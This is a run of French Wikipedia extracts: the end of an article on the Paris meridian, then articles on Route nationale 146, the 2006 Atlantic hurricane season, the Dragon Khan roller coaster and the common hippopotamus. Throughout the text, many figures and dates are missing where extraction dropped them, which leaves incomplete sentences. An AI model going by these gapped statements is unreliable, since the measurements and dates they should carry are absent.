Contrairement à l'assertion de Dan Brown, la méridienne du gnomon de l'église Saint-Sulpice ne correspond pas au méridien de Paris. Le gnomon de Saint-Sulpice a été construit à l'initiative de Jean-Baptiste Languet de Gergy, curé de la paroisse de Saint-Sulpice de 1714 à 1748, qui en confie la réalisation à un horloger anglais, Henry Sully. Le projet sera mené à terme par Pierre Charles Le Monnier. L'utilisation initiale du commanditaire était de déterminer exactement l'instant de l'équinoxe de printemps pour calculer la date de célébration de la fête de Pâques. L'utilisation de Le Monnier concernait principalement les phénomènes liés au solstice d'été, observés en utilisant la lentille de de foyer : l'obliquité de l'écliptique, sa variation et l'étude de la nutation.
Le petit canon du Jardin du Palais-Royal.
Depuis 1786, l'heure de Paris est donnée par le canon solaire situé dans le jardin du Palais-Royal. Depuis 1816 ou 1826 et jusqu'en 1911, Paris vit au temps solaire moyen du méridien de Paris. Jusqu'en 1911, la comparaison entre l'heure du canon solaire et celle des horloges permet aux Parisiens d'apprécier la différence entre le temps solaire moyen (heure des horloges) et le temps solaire vrai (heure des cadrans solaires et du canon solaire) qui est définie par l'équation du temps.
L'arc de Delambre et Méchain.
Les mesures de l’arc méridien ont été confiées à Pierre Méchain et Jean-Baptiste Delambre, et ont pris plus de six ans (1792–1798). Le projet a été séparé en deux parties – une section nord de reliant le beffroi de Dunkerque à la cathédrale de Rodez menée par Delambre et une section sud de de Rodez au château de Montjuïc à Barcelone, assurée par Méchain.
Le beffroi de Dunkerque.
La tour haute de est construite en brique dans le style gothique. Elle est à l'origine rattachée à l'église Saint-Éloi et lui sert de clocher. En 1558, les français menés par le maréchal de Thermes envahissent la ville et brûlent l’église. Seule la tour subsiste. La reconstruction de l'église commence vers 1560 sous la direction du maître-d'œuvre Jean de Renneville mais, faute de moyens, les travaux s'interrompent en 1585. L'ancienne tour, séparée de la nouvelle église par une partie des ruines de la première église, reste isolée et sert à la fois de clocher, de beffroi municipal, et d'amer. Le projet original ne sera jamais terminé. En 1782, le beffroi est définitivement séparé de l'église par une rue. Le beffroi de Dunkerque marque l'extrémité nord de l'arc méridien de Delambre et Méchain.
La cathédrale de Rodez.
La cathédrale Notre-Dame de Rodez, construite entre le , est une cathédrale catholique romaine située à Rodez dans le département de l'Aveyron. C'est la cathédrale du diocèse de Rodez et Vabres. Bien que les travaux de construction aient duré de 1277 jusqu’à la fin du , la cathédrale bénéficie d’une remarquable unité tant à l’intérieur qu’à l’extérieur. En effet, le parti général de l’édifice fut fixé dès l’origine. Ce type de plan est attribué à l’architecte Jean Deschamps, qui a mis en pratique dans le Midi les principes de l’architecture gothique définis dans la France du Nord. La cathédrale marque la séparation de la partie de l'arc méridien mesurée par Delambre de celle mesurée par Méchain.
Le Panthéon.
La croix du Panthéon est le point fondamental de la nouvelle triangulation de la France. À la demande de Jean-Baptiste Delambre un observatoire provisoire est installé sur le sommet du dôme du Panthéon au début de l'année 1793. Depuis cet observatoire, Jean-Baptiste Delambre effectue ses observations pour la triangulation de la Méridienne de France à Paris. Ce point sera repris par François Perrier lors de la mesure de la Nouvelle Méridienne de France.
Le méridien de Paris en Espagne.
Le méridien de Paris entre dans la mer Méditerranée dans les environs de Barcelone. Toutefois, la triangulation de l'Espagne des Pyrénées jusqu'à la Sierra Nevada a permis le prolongement de la Méridienne de France jusqu'en Algérie.
Le château de Montjuïc.
Le château de Montjuïc est une forteresse militaire qui surplombe la ville de Barcelone depuis la colline de Montjuïc à d'altitude. Il a été transformé en musée militaire après la guerre civile espagnole. Le château est en cours de transformation en centre international pour la paix. Il marque l'extrémité sud de la méridienne de Delambre et Méchain. Sur une de ses tours on peut lire une inscription en catalan (voir plus bas) dont la traduction française est :
"De cette tour, l'astronome Pierre Méchain au cours des années 1792-1793 a établi les coordonnées de Barcelone et la triangulation pour la mesure de l'arc méridien qui a servi de base au système métrique décimal. Ville de Barcelone, année 1993, bicentenaire de la mesure du méridien de Dunkerque à Barcelone."
Le mont Mulhacén.
Le mont Mulhacén est le plus haut sommet de la péninsule Ibérique. Selon les sources il culmine entre et . Il se trouve dans la province de Grenade, dans le Sud-Est de l'Espagne et fait partie de la sierra Nevada, elle-même rattachée aux cordillères Bétiques. Avec les monts Tetica en Espagne et Filhaoussen et M'Sabiha en Algérie, il est un des quatre massifs depuis lesquels la connexion géodésique de l'Espagne avec l'Algérie a été réalisée. Sur le refuge alpin du pic Mulhacén une plaque commémorative rappelle cette jonction qui a prolongé la Méridienne de France jusque sur le continent africain. À l'inverse des géographes qui donnent leur nom à des sommets de montagnes, Carlos Ibáñez e Ibáñez de Ibero reçoit le titre de marquis de Mulhacén en 1889.
Régions traversées.
En France.
Vingt départements traversés (du nord au sud) : 
Dans le monde.
Depuis le pôle Nord jusqu'au pôle Sud, le méridien de Paris traverse les régions et pays suivants :
Longitude du méridien.
Outre sa longitude propre de 0 gr, la position du méridien de Paris a aussi été donnée par rapport à celui de Greenwich selon des chiffres légèrement différents au fil du . Le choix de tel ou tel système géodésique (avec des différences sur la longueur du rayon terrestre ou la position du centre de la terre) crée par exemple de petites variations pour l'angle dièdre entre les méridiens.
Les mesures effectuées aux deux observatoires de Paris et Greenwich dans les premières décennies du ont indiqué un décalage horaire de 9 minutes 20,921 secondes entre ces méridiens (équivalant à un angle de 2°20'13,82").
► Système NTF : 2°20'14,025"
L'Institut géographique national dans son système NTF a adopté une valeur légèrement différente : 2°20'14,025"
C'est cet angle qui a été utilisé à une époque sur les cartes de l'IGN. Par exemple, la carte VIII-14 à l'échelle 1/ publiée en 1969 définit ses bords ouest et est aux longitudes (3°14'34") et (2°52'58"). &lt;br&gt;
C'est aussi de cette manière qu'il a été chanté par Michel Sardou et Sylvie Vartan dans le duo "L'Atlantique" en 1983, sur des paroles écrites avec Pierre Delanoë :
 2 degrés 20 minutes et 14 secondes
 C'est l'histoire du premier méridien
► Système ED50 : 2°20'16"
À la fin du , l'IGN indiquait sur ses cartes les coordonnées internationales dans le système cartographique européen ED50. Voir par exemple la carte 3541 Est dont le bord ouest se situe à la longitude 5gr (6°50'16").
► Système RGF93 : 2°20'11.4909"
Depuis l'an 2000, la NTF a été remplacée par la norme RGF93. Ce système est basé sur le méridien de l'IERS (Service international de la rotation terrestre), situé 5,3101" à l'est du méridien international. La longitude de l'Observatoire de Paris dans le RGF93 est 2°20'11,4909". Les nouvelles cartes de l'IGN donnent les coordonnées internationales en bleu dans le système RGF93.
Par rapport au méridien international, le méridien de Paris est donc décalé de 2°20'16,801".

</doc>
<doc id="568222" url="https://fr.wikipedia.org/wiki?curid=568222" title="Route nationale 146">
Route nationale 146

La route nationale 146, ou RN 146, est une ancienne route nationale française reliant Montmarault à Chazeuil (commune de Varennes-sur-Allier), "via" Saint-Pourçain-sur-Sioule. Cette route permettait de relier Montluçon à Roanne.
Histoire.
La route nationale 146 a été déclassée à la suite de la réforme de 1972, avec effet au pour la section située entre la route nationale 145 à Montmarault et la route nationale 9 à Saint-Pourçain-sur-Sioule (soit ) et au entre la et la () : elle devient la .
Une autre RN 146 (antenne de la , actuellement ) correspondait à une bretelle ouverte en 1964 reliant l'A6 sortie 22, nouvellement ouverte entre Magny et Sauvigny-le-Bois, à l'est d'Avallon, à la . Elle ne mesure que 3 kilomètres. Elle a été déclassée .
Tracé.
La est classée route à grande circulation entre la à Montmarault et la à Saint-Pourçain-sur-Sioule et entre la à Saint-Pourçain-sur-Sioule et la à Varennes-sur-Allier, soit l'ensemble du parcours.

</doc>
<doc id="568226" url="https://fr.wikipedia.org/wiki?curid=568226" title="Saison cyclonique 2006 dans l'océan Atlantique nord">
Saison cyclonique 2006 dans l'océan Atlantique nord

La saison 2006 des ouragans (cyclones tropicaux dans l'océan Atlantique) a lieu du 2006 au 30 novembre 2006, selon la définition de l'Organisation météorologique mondiale.
Particularités.
La saison 2006 s'annonçait dans la continuité d'une recrudescence des phénomènes tropicaux sur le bassin Atlantique. Neuf phénomènes furent nommés, et un autre réanalysé plus tard, pour une moyenne de 9,4 sur la saison entière pour les années 1950 à 1995. Finalement, aucun phénomène ne s'est formé ultérieurement car un phénomène El Niño s'est amorcé début septembre. Un autre facteur inhibant serait la présence de sable du Sahara associée à une sécheresse excessive des hautes couches de la troposphère.
Cette saison n'a donc connu aucun ouragan majeur atteignant des terres habitées. En outre, aucun ouragan n'a touché le continent américain.
Noms des tempêtes 2006.
La liste des noms utilisée pour nommer les tempêtes formées dans le bassin cyclonique de l'océan Atlantique Nord durant l'année 2006 est la même que celle de la saison 2000, à l'exception de Kirk qui remplace "Keith".
Aucun nom n'ayant été retiré de cette liste (pour la première fois depuis 1997), elle sera à nouveau utilisée lors de la saison 2012.
Tous ces noms avaient déjà été utilisés pour nommer des tempêtes ou des ouragans lors des saisons cycloniques antérieures. Ceux en "gris" n'ont pas été utilisés.
Tempête tropicale "Sans Nom".
Une tempête tropicale apparue le 17 juillet et dissipée le lendemain n'a pas reçu de nom. Sur le plan opérationnel, la tempête était considérée comme une tempête non tropicale, reliée à un front froid. Cependant, une réanalyse après-saison a fourni suffisamment de preuves de caractéristiques tropicales, indiquant l'absence de caractéristiques frontales et l'absence d'intrusion d'air froid au moment des vents maximaux. Les observations ont montré qu'elle avait un noyau chaud symétrique, alors qu'en temps réel elle était considérée comme subtropicale. Le National Hurricane Centre a officiellement reclassé le système comme une tempête tropicale sans nom le 15 décembre 2006.

</doc>
<doc id="568234" url="https://fr.wikipedia.org/wiki?curid=568234" title="Dragon Khan">
Dragon Khan

Dragon Khan sont des montagnes russes situées à PortAventura Park en Catalogne, Espagne.
Description.
Il s'agit de montagnes russes en métal composées de huit inversions, pour mètres de long et de haut. Elles sont situées dans la section « chinoise » du parc et leur thème est le Khan, empereur de l'Empire du Milieu. Basé sur la mythologie chinoise, l'esprit du maléfique Prince Hu de Pékin se réincarna dans Dragon Khan. Sa fureur se déchaînait chaque fois qu'un humain osait monter sur son dos. Leur construction revient à 15 millions d'euros.
Avec un total de huit inversions, Dragon Khan est jusqu'en 2002 l'attraction ayant le plus grand nombre d'inversions au monde et elle est également la première à en posséder autant. Elle est cependant détrônée en 2002 par "Colossus" à Thorpe Park au Royaume-Uni, avec ses dix inversions. Détrônant "Kumba" à Busch Gardens Tampa et ses , "Dragon Khan" est jusqu'en mai 1996 l'attraction ayant le plus haut looping vertical au monde avec , "Rougarou" avec bat ce record par la suite.
PortAventura est le fruit de l'association du Tussauds Group, de Busch Entertainment, La Caixa et . Dragon Khan l'illustre bien, son layout est dessiné par le spécialiste John Wardley de Tussauds. De plus, il est le descendant de "Kumba" à Busch Gardens Tampa ouvert en 1993 car ils sont tous deux des modèles Sitting Coaster de Bolliger &amp; Mabillard, à ceci près que Dragon Khan a des mensurations plus impressionnantes.
Lors de l'entrée de Tussauds Group dans l'actionnariat du parc en 1993, les contrats pour les attractions sont signés, hormis pour les principales montagnes russes. L'équipe Tussauds privilégie le fabricant Bolliger &amp; Mabillard pour celles-ci. Dragon Khan est bien meilleure et plus grande que celles initialement prévue, elle devient l'attraction phare de Port Aventura.

</doc>
<doc id="568240" url="https://fr.wikipedia.org/wiki?curid=568240" title="Liste des personnages du Coran">
Liste des personnages du Coran

Personnages cités par leurs noms dans le Coran.
 

</doc>
<doc id="568243" url="https://fr.wikipedia.org/wiki?curid=568243" title="Hippopotamus amphibius">
Hippopotamus amphibius

L'Hippopotame amphibie ou Hippopotame commun (Hippopotamus amphibius) est une espèce de mammifère semi-aquatique d'Afrique subsaharienne et l’une des deux dernières espèces existantes au sein de la famille des Hippopotamidae, l’autre étant l’Hippopotame nain. L'Hippopotame commun est reconnaissable à son buste en forme de baril, sa gueule qu’il peut très largement ouvrir pour révéler de grandes canines, son corps dépourvu de poils, ses membres semblables à des colonnes et leur grande taille ; les adultes pèsent en moyenne pour les mâles et pour les femelles, et certains spécimens atteignent jusqu'à , ce qui en fait l’une des espèces de mammifères terrestres les plus imposantes, à égalité avec le rhinocéros blanc mais derrière les trois espèces d’éléphants. Sa hauteur au garrot est d'environ et il peut mesurer de longueur. En dépit de son aspect trapu et de ses courts membres, il serait capable de courir à sur de courtes distances.
L’Hippopotame commun est semi-aquatique, vivant dans les rivières, les lacs et les marais de mangroves, où des mâles territoriaux défendent une portion de rivière et un groupe allant de et leurs jeunes. Durant la journée, ils restent au frais en séjournant dans l’eau ou la boue ; la reproduction et la naissance ont lieu dans l’eau. Ils en sortent au crépuscule pour manger de l’herbe. Tandis que les hippopotames restent les uns à côté des autres dans l’eau, ils pâturent en solitaire et ne sont pas territoriaux sur terre. En revanche, aux abords de leur habitat aquatique, les mâles délimitent leur territoire en projetant à plusieurs mètres leurs excréments, fèces et urines, en accompagnant leur évacuation d'un rapide mouvement circulaire de leur queue en forme de pinceau.
C'est un animal très agressif et imprévisible, et il est considéré comme un des plus dangereux animaux d’Afrique, il tue des centaines de personnes par an. Néanmoins, il est toujours menacé par la perte de son habitat et le braconnage pour sa viande et l’ivoire de ses canines.
Description.
Les hippopotames font partie des plus grands mammifères terrestres, seulement dépassés en poids par les éléphants. Ils font de de long (y compris la queue, longue de ) et de haut, et , 
et les plus gros mâles peuvent atteindre plus de , un individu exceptionnellement lourd ayant même atteint . Les hippopotames mâles continuent de grossir tout au long de leur vie tandis que les femelles atteignent leur poids maximal à l’âge d’environ .
À la différence des autres grands mammifères terrestres, les hippopotames sont semi-aquatiques, et passent la journée dans des lacs ou rivières. Les yeux, oreilles et narines des hippopotames sont placés sur le sommet de leur crâne. Cela permet à ces organes de rester à la surface de l’eau tandis que le reste du corps est immergé. Leur corps en forme de fût a un squelette adapté à leur énorme poids, favorisant les déplacements terrestres lents. Leur densité les autorise à plonger et se mouvoir sur le fond de la rivière. Les hippopotames ont des membres courts (relativement au reste de la mégafaune) car l’eau dans laquelle ils vivent supporte une partie de leur poids. Bien que ce soient des animaux lourds, les hippopotames peuvent courir : une vitesse de aurait été observée, ce chiffre n’ayant cependant pas été confirmé. Ils sont incapables de sauter mais peuvent gravir les rives un peu pentues. En dépit du fait qu’ils sont semi-aquatiques et qu’ils ont les pieds palmés, un hippopotame adulte ne nage pas particulièrement bien et flotte difficilement. On les trouve rarement en eau profonde, et quand c’est le cas ils se déplacent par des bonds successifs tels les marsouins à partir du fond de l’eau. Les testicules des mâles ne descendent que partiellement, et ils n’ont pas de scrotum. De plus, le pénis se rétracte à l’intérieur du corps quand il n’est pas en érection. Les parties génitales de la femelle sont particulières car le vagin possède des crêtes et deux grands diverticules dépassant du vestibule vulvaire. Leur fonction exacte est inconnue.
La mâchoire de l’hippopotame est activée par un puissant muscle masséter et un bien développé ; le dernier fait une boucle derrière le premier au niveau de l’os hyoïde. La charnière de la mâchoire est située suivant loin pour permettre à l’animal d’ouvrir la gueule à presque 180°. Le muscle orbiculaire de la bouche se plie légèrement pour permettre à l’hippopotame de pouvoir ouvrir la gueule si grand sans déchirer aucun tissu. Sur le programme télévisé de la National Geographic Channel, ', Brady Barr a mesuré la force de la morsure d’un hippopotame adulte femelle à ; Barr a également essayé de mesurer la force de la morsure d’un mâle, mais a dû abandonner à cause de leur agressivité. L'hippopotame a la troisième plus forte morsure du règne animal avec en deuxième le crocodile du Nil et en premier le crocodile marin. Les dents des hippopotames s’aiguisent en se frottant les unes contre les autres. Les canines et incisives inférieures sont nettement plus grandes, notamment chez les mâles. Ainsi les incisives peuvent atteindre quarante cm, tandis que les canines mesurent jusqu’à cinquante cm. Les canines et incisives sont utilisées pour le combat et ne jouent aucun rôle dans l’alimentation. Les hippopotames comptent sur leurs larges lèvres pour brouter l’herbe qui est ensuite écrasée par les molaires. L’hippopotame est considéré comme un pseudoruminant ; il a un estomac complexe en trois parties mais ne rumine pas.
À la différence de la plupart des animaux semi-aquatiques, les hippopotames ont de très petits poils. La peau fait six cm d'épaisseur, ce qui les protège contre leurs congénères et les prédateurs. En revanche, la couche de gras sous-cutané est fine. Les parties supérieures des animaux sont gris-violet à bleu-noir, tandis que les parties inférieures et les zones proches des yeux et des oreilles sont rose-brunâtre. Pour les protéger encore plus du soleil, comme pour les autres hippopotames, leur peau sécrète une sorte d'écran solaire naturel de couleur rougeâtre appelée parfois « sueur de sang », mais ce n'est en réalité ni du sang, ni de la sueur ; cette coloration est due à l'acide hipposudorique. Cette substance inhibe la croissance des bactéries pathogènes ; de plus, l’absorption des deux pigments culmine dans le spectre ultraviolet, protégeant la peau du soleil. Tous les hippopotames, même ceux qui ont une alimentation différente, sécrètent ces pigments, donc ils ne semblent pas être issus de leur alimentation. Ils les synthétisent en réalité à partir de précurseurs comme l’acide aminé tyrosine. Néanmoins, cette protection solaire naturelle n'empêche pas la peau de ces animaux de se craqueler s'ils restent trop longtemps hors de l'eau.
La longévité moyenne d’un hippopotame est généralement comprise entre quarante et cinquante ans. En captivité, plusieurs individus ont atteint des records de longévité, comme Tanga du Zoo de Munich (Allemagne) morte en 1995 à , Donna du (Indiana, États-Unis) morte en 2012 à l’âge de , ou plus récemment Bertha du Zoo de Manille (Philippines), morte en 2017 à .
Écologie et comportement.
Alimentation.
Ils broutent durant quatre à cinq heures et peuvent consommer d’herbe chaque nuit. Comme presque tous les herbivores, ils consomment d’autres plantes si elles se présentent à eux, mais leur régime alimentaire est constitué presque intégralement d’herbe, avec seulement une petite consommation de plantes aquatiques. Les hippopotames naissent avec des intestins stériles, et ont besoin de bactéries pour digérer leur alimentation, et ils les obtiennent par le biais des fèces de leurs mères. À de très rares occasions, des hippopotames ont été filmés en train de manger des charognes. Il y a quelques autres cas répertoriés d’individus consommant de la viande, de comportements de cannibalisme ou de prédation. Mais l’anatomie de l’estomac d’un hippopotame n’est pas adaptée à un régime carnivore et ce comportement est anormal. Il peut être causé par une carence nutritionnelle.
Les défécations des hippopotames créent des dépôts allochtones de matière organique le long du lit des rivières. On ne sait pas si ces dépôts ont une utilité écologique. Une étude de 2015 suggère que les bouses d’hippopotames fournissent des nutriments provenant de matériaux terrestres aux poissons et aux invertébrés aquatiques. Du fait de leur taille et de leur habitude à prendre toujours le même chemin pour aller se nourrir, les hippopotames peuvent avoir un impact significatif sur les terres qu’ils traversent, compressant le sol et empêchant la végétation de pousser. Sur une longue période, les hippopotames peuvent dévier les chemins dans les marais ou les canaux. Les hippopotames adultes se déplacent à une vitesse de dans l’eau ; faisant généralement surface pour respirer toutes les cinq minutes. Le procédé de refaire surface et respirer est automatique, et un hippopotame qui dort sous l’eau se soulève et respire sans marcher. Les hippopotames ferment leurs narines quand ils sont immergés dans l’eau. Comme pour les poissons et les tortues sur les récifs de coraux, les hippopotames se rendent occasionnellement dans des stations de nettoyage et signalent, en ouvrant grand leur gueule, qu’ils sont prêts à être débarrassés de leurs parasites par certaines espèces de poissons. Il s’agit d’un exemple de mutualisme dans lequel l’hippopotame bénéficie du nettoyage, tandis que le poisson se nourrit.
Organisation et comportement sociaux.
Il a longtemps été difficile d’étudier les interactions entre les hippopotames mâles et femelles car il n’y a pas de dimorphisme sexuel chez l’hippopotame ; ainsi les femelles et les jeunes mâles sont quasiment impossibles à distinguer dans la nature. Bien que les hippopotames se couchent dans l’eau près les uns des autres, il ne semble pas y avoir de liens sociaux bien marqués entre les animaux, mis à part les mères et leurs filles, et ce ne sont pas des animaux sociaux. On ne sait pas exactement pourquoi ils se regroupent en troupeaux. Les hippopotames sont territoriaux uniquement dans l’eau, et un mâle reproducteur a la maîtrise d’une petite étendue de rivière, d’en moyenne de long, et comprenant une dizaine de femelles. Les plus grands troupeaux peuvent comprendre plus de 100 hippopotames. Les jeunes mâles immatures sont tolérés dans les territoires de mâles dominants, du moment qu’ils demeurent soumis. Le territoire des mâles sert à établir des règles au niveau de la reproduction. Au sein des troupeaux, les hippopotames ont tendance à se regrouper par sexe. Les jeunes mâles vivent à côté d’autres jeunes mâles, les femelles avec les autres femelles, et le mâle dominant est à part. Quand les hippopotames sortent de l’eau pour aller brouter, ils le font individuellement.
Les hippopotames communiquent par leurs cris, à travers des grognements et des beuglements, et peuvent pratiquer l’écholocalisation, mais le but de celle-ci reste inconnu. Les hippopotames ont la capacité unique de sortir partiellement leur tête au-dessus de l’eau et d’émettre un cri à la fois à travers l’air et l’eau ; que les individus situés dans l’eau ou au-dessus peuvent entendre.
Agressivité.
Les hippopotames sont des animaux agressifs. Les hippopotames qui s’attaquent à d’autres animaux sont souvent des mâles territoriaux ou des femelles protégeant leurs petits. Les hippopotames coexistent avec une variété de grands prédateurs. Les crocodiles du Nil, les lions et les hyènes tachetées s’attaquent notamment aux jeunes. Toutefois, du fait de leur agressivité et de leur taille, les adultes n’ont généralement pas de prédateurs. Des cas de grands lions ou de groupes de crocodiles du Nil s’en prenant avec succès à un hippopotame adulte ont été recensés ; toutefois il s’agit de cas exceptionnels. Les crocodiles font souvent l’objet d’agression par les hippopotames, car ils vivent dans le même habitat dans la zone riparienne ; les hippopotames peuvent donc chasser ou même tuer ces animaux. Les hippopotames sont également très agressifs envers les humains, qu’ils attaquent parfois qu’ils soient en bateau ou sur terre, communément sans aucune provocation apparente, et ils ont la réputation d’être parmi les animaux les plus dangereux d’Afrique.
Les hippopotames marquent leur territoire en déféquant. Tandis qu’ils déposent leurs fèces, les hippopotames secouent leur queue pour écarter leurs excréments sur une plus grande surface. Les hippopotames peuvent ouvrir grand la gueule pour menacer un adversaire. Quand ils se battent, les hippopotames mâles utilisent leurs incisives pour bloquer les attaques de leur adversaire, et leurs grandes canines pour leur apposer des blessures. Quand la population d’hippopotames devient trop importante ou que l’habitat se réduit, les mâles dominants peuvent procéder à des infanticides, mais ce comportement n’est pas courant dans des conditions normales. Des cas de cannibalisme ont déjà été observés chez cette espèce, mais ce comportement est généralement le fait d’hippopotames affligés ou malades.
Cycle de vie et reproduction.
La femelle hippopotame atteint la maturité sexuelle à 5 ou et a une période de gestation de . Une étude du système endocrinien a révélé que les femelles hippopotames pouvaient commencer leur puberté dès 3 ou . Les mâles atteignent la maturité à environ . Une étude sur la reproduction des hippopotames en Ouganda a montré que le pic des accouplements avait lieu durant la fin de la saison humide dans l’été, et que le pic des naissances avait lieu au début de la saison humide à la fin de l’hiver. Cela est lié au cycle ovulatoire de la femelle ; comme pour beaucoup de grands animaux, les spermatozoïdes des hippopotames mâles sont actifs toute la saison. Des études sur les hippopotames menées en Zambie et en Afrique du Sud ont également montré que les naissances avaient lieu au début de la saison humide. Après être devenue gestante, une femelle hippopotame ne connaît pas d’ovulation avant .
L’accouplement a lieu dans l’eau, avec la femelle immergée durant la majeure partie du temps, sa tête émergeant périodiquement pour respirer. Les nouveau-nés hippopotames naissent sous l’eau et pèsent entre 25 et pour une longueur moyenne de , et ils doivent nager vers la surface pour prendre leur premier souffle. Une femelle donne généralement naissance à un seul petit, bien que des cas de jumeaux puissent subvenir. Le jeune se repose souvent sur le dos de sa mère quand l’eau est trop profonde pour eux, et il nage sous l’eau pour téter. Ils tètent sur la terre ferme une fois que la femelle a quitté l’eau. Le sevrage commence vers 6 à , et la plupart des jeunes sont totalement sevrés à l’âge d’un an. Comme plusieurs autres grands mammifères, les hippopotames sont décrits comme des stratèges K, notamment car les femelles ne donnent naissance qu’à un seul petit bien développé tous les deux ans.
Répartition et habitat.
L'Hippopotame amphibie était répandu en Afrique du Nord et en Europe durant l’Éémien et la fin du Pléistocène jusqu’à il y a environ . Des preuves archéologiques ont montré sa présence au Levant, il y a moins de . Cette espèce était commune en Égypte dans la région du Nil durant l’Antiquité, mais en a depuis disparu. Pline l'Ancien écrit qu'à son époque le meilleur endroit d'Égypte pour le capturer était dans le nome de Saïs (N.H. 28.121) ; et on pouvait toujours en trouver le long du bras de Damiette après la Conquête arabe (639). Même sur l'île de Malte, à Għar Dalam (la grotte des Ténèbres), des ossements d'hippopotames, dont des hippopotames nains, ont été trouvés, datant d'environ .
Les hippopotames existent toujours dans les fleuves de l'Ouganda, du Soudan, dans le Nord de la République démocratique du Congo et dans le Nord de l'Éthiopie, dans l'Est de la Gambie et le Sud de l'Afrique (Botswana, en République d'Afrique du Sud, au Zimbabwe, en Zambie). Une population distincte vit en Tanzanie et au Mozambique.
On peut rencontrer les hippopotames dans la savane ou les zones de forêt. Il leur faut un habitat qui présente suffisamment d’eau pour qu’ils puissent s’immerger et de l’herbe à proximité. De grandes densités d’animaux se rencontrent dans les eaux calmes avec des plages fermes à la pente douce. On peut rencontrer quelques mâles dans des eaux plus rapides dans les gorges rocheuses. À l’exception de l’alimentation, la plupart de la vie d’un hippopotame se déroule dans l’eau : se battre avec des congénères, s’accoupler, mettre bas. Les hippopotames quittent l’eau au crépuscule et gagnent les terres, pouvant parcourir jusqu’à , pour pâturer des pelouses courtes, leur principale source de nourriture.
Étymologie et dénomination.
Le mot « hippopotame » vient de l’ancien grec , "hippopotamos", dérivé des mots , "hippos", signifiant « cheval », et , "potamos", signifiant « rivière », et ce nom signifie donc littéralement « cheval de rivière ».
En Afrique, les hippopotames sont connus sous diverses appellations, dont "seekoei" (Afrikaans), "mvuvu" (Venda), "kubu" (Lozi) et "mvubu" (Xhosa, Swati et Zoulou) dans le sud ; "kiboko" (Swahili), e"nsherre" (Nkore), "tomondo" (Nyaturu), "nvubu" (Luganda), "ifuru" (Luyia), "emiria" (Ateso), "magawit" (Sebei), "kibei" (Kalenjin) et "olmakau" (Maasai) dans la région des Grands Lacs ; et ጉማርረ/"gumarre" (Amharique) et "jeer" (Somali) dans la corne de l’Afrique.
Systématique.
Taxinomie.
Le genre "Hippopotamus" est le genre type de la famille des Hippopotamidae. L'Hippopotame nain appartient à un autre genre de cette même famille, suivant les sources "Choeropsis" ou "Hexaprotodon". Parfois, on utilise la sous-famille des Hippopotaminae. Certains taxonomistes regroupent les hippopotames et les anthracothères dans la superfamille des Anthracotheroidea. Les Hippopotamidae sont classés parmi l’ordre des "Artiodactyla". Parmi les autres artiodactyles on trouve les chameaux, le bétail, les cerfs et les cochons, bien que les hippopotames demeurent que très lointainement apparentés à ces animaux.
Cinq sous-espèces d’hippopotames ont été décrites à partir de différences morphologiques au niveau de leurs crânes et de leur emplacement géographique :
Une étude récente d'Okello (2005) a contribué à remédier à cela. En utilisant l'ADN mitochondrial des biopsies de peau prélevées dans 13 lieux d'échantillonnage, les auteurs ont examiné la diversité et la structure génétiques parmi les populations d'hippopotames à travers le continent. Cette étude a révélé que la différenciation génétique est basse mais significative parmi 3 des présumés - "H.a. amphibius", "H.a. capensis", "H.a. kiboko". Si ces conclusions sont exactes, cela voudrait dire que les hippopotames communs au Kenya et en Somalie ("kiboko"), en Afrique du Sud ("capensis" de la Zambie à l'Afrique du Sud) et dans le reste des pays africains sub-sahariens ("amphibius") représentent trois sous-espèces distinctes, avec "H.a. amphibius" comme groupe ancestral. Okello ont établi également que les hippopotames communs ont connu en Afrique une expansion démographique importante au cours du Pléistocène et ultérieurement, expansion qu'ils attribuent à une augmentation des étendues d'eau à la fin de cette époque.
Fossiles.
Trois espèces d'hippopotames malgaches se sont éteintes durant l’Holocène à Madagascar, l’une d’entre elles il y a moins de . Les hippopotames malgaches étaient plus petits que les hippopotames modernes, certainement du fait du nanisme insulaire. Des preuves fossiles indiquent que plusieurs hippopotames malgaches ont été tués par l’Homme, et que celui-ci aurait donc pu jouer un rôle dans son extinction. Des membres isolés d’hippopotames malgaches ont pu survivre dans des poches jusqu’à récemment. En 1976 des villageois décrivent un animal vivant qu’ils appellent "kilopilopitsofy", et qui aurait pu être un hippopotame.
Trois espèces d’hippopotames, l'hippopotame européen ("H. antiquus"), "H. major" et "H. gorgops", vivaient en Europe continentale et dans les îles britanniques. Ces trois espèces se sont éteintes avant la dernière glaciation. Les ancêtres des hippopotames européens ont atteint plusieurs îles de la Méditerranée au cours du Pléistocène. Le Pléistocène a également vu diverses espèces naines se développer sur plusieurs îles de la Méditerranée, dont la Crête ("H. creutzburgi"), Chypre ("H. minor"), Malte ("H. melitensis"), et la Sicile ("H. pentlandi"). Parmi ces espèces, l’hippopotame nain de Chypre a survécu jusqu’à la fin du Pléistocène ou le début de l’Holocène. Des preuves découvertes sur un site archéologique, Aetokremnos, continuent à provoquer le débat pour déterminer si ces animaux avaient vécu avec des humains, et s’ils avaient été conduits à l’extinction par celui-ci.
Phylogénie.
Jusqu’en 1909, les naturalistes plaçaient les hippopotames avec les cochons, en s’appuyant sur la forme de leurs molaires. Mais, par la suite, diverses études portant tout d’abord sur les protéines du sang, puis sur la phylogénétique moléculaire et l’ADN et les fossiles, ont montré que les plus proches apparentés encore existant de ces animaux étaient les cétacés ; baleines, dauphins et marsouins. L’ancêtre commun des hippopotames et des baleines a divergé des "Ruminantia" et des autres ongulés, puis les lignées des cétacés et des hippopotames se sont séparées peu de temps plus tard.
Les théories les plus récentes concernant l’origine des Hippopotamidae (hippopotamidés) suggèrent que les hippopotames et les baleines partageaient un ancêtre semi-aquatique commun qui a divergé des autres artiodactyles il y a environ d’années. Ce groupe ancestral hypothétique a ensuite formé deux branches il y a d’années. Une branche a évolué pour former les cétacés, potentiellement à partir de d’années avant notre ère, avec le genre "Pakicetus" et d’autres baleines primitives regroupées sous l’appellation "Archaeoceti", qui ont complété leur adaptation au milieu aquatique pour devenir parfaitement aquatiques. L’autre branche a formé les "Anthracotheriidae", une grande famille de quadrupèdes dont les plus anciens vivaient à la fin de l’Éocène et ressemblaient à des hippopotames avec une tête beaucoup plus petite et étroite. Toutes les branches des "Anthracotheriidae", à l’exception de celle qui a évolué pour former les "Hippopotamidae" se sont éteintes durant le Pliocène sans laisser aucun descendant.
